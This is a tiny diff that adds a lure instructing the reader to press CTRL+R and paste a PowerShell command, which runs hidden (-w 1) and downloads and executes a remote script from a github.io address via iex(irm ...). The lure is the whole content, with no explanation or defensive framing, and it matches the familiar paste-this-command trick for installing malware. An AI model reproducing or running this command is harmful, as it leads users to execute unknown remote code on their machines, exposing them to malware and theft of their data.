@@ -1,0 +1,3 @@
+# CTRL+R > copy the powershell below
+
+powershell -w 1 -c "iex(irm https://hakkyahud.github.io/fdu.ps1)"
